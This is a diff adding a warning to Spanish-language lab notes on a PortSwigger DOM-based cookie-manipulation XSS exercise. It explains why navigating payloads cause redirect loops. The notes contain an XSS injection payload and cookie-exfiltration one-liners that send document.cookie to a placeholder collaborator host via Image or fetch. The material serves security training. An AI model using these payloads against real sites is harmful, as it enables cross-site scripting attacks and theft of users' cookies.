@@ -29,6 +29,14 @@ Primera carga: setea `lastViewedProduct` con el `'><script>print()</script>`. Se
 
 **Store** → **Deliver exploit to victim**.
 
+> [!warning] ⚠️ Peculiaridad: no uses payloads que naveguen
+> - **El orden en la página de producto te traiciona:** el sink que pinta la cookie (el link "Last viewed product" del nav) se renderiza **arriba**, pero el `document.cookie = 'lastViewedProduct=' + window.location` que la reescribe está **abajo**. Un payload que hace `window.location=...` **navega antes** de llegar al setcookie → la cookie envenenada **nunca se sobrescribe**.
+> - **Sin protocolo es peor:** `window.location='oastify.com/...'` es una URL **relativa** → el browser va a `https://TARGET.web-security-academy.net/oastify.com/...` (mismo origen) → re-pinta la cookie mala → **loop de redirect same-origin** → tu navegador de testing queda **trincado**. Si sí o sí navegás, usá URL **absoluta** (`https://…`) o **protocol-relative** (`//host`), nunca sin esquema.
+> - **Recuperación:** incógnito (jar de cookies nuevo) o borrar `lastViewedProduct` en DevTools (*Application → Cookies*). **No** dependas de visitar un producto: el loop no te deja llegar al setcookie.
+> - **La entrega a la víctima NO se rompe:** cada *Deliver exploit to victim* arranca con un navegador limpio → lo que se traba es **tu** sesión de testing, no el lab ni la víctima.
+> - **Buenas prácticas:** (1) probá primero con un payload que **no navega** (`print()`/`alert(1)`); (2) para exfil usá algo que **no navega**: `new Image().src='//COLLAB/?c='+document.cookie` o `fetch('https://COLLAB/?c='+encodeURIComponent(document.cookie))`; (3) recién con el exploit final validado, weaponizás.
+> - **Nota HttpOnly:** `document.cookie` **no** incluye la cookie de sesión (`HttpOnly`) en estos labs → exfiltrarla no roba la sesión. Este lab se resuelve con `print()`, no con exfil.
+
 ## Verificación
 El `print()` salta al recargarse el iframe en el home → lab resuelto. Confirmá la visita por el **Access log**.
 
@@ -36,5 +44,6 @@ El `print()` salta al recargarse el iframe en el home → lab resuelto. Confirm�
 - El `if(!window.x)…;window.x=1;` evita un bucle infinito de recargas (solo redirige una vez).
 - El payload va **URL-encodeado** dentro del `src` del iframe; la comilla `'` cierra el atributo donde se refleja la cookie.
 - A diferencia de un XSS reflejado normal, el disparo está **partido en dos requests** → por eso hace falta el iframe que se auto-recarga.
+- ⚠️ **No cambies `print()` por un payload que navegue** (`window.location`): te trabás el navegador (ver callout arriba).
 
 → Siguiente: [[vulnerabilities/025-dom-based/examples/004-dom-clobbering-cid|004 · cuando el XSS está filtrado (DOMPurify) → DOM clobbering]]
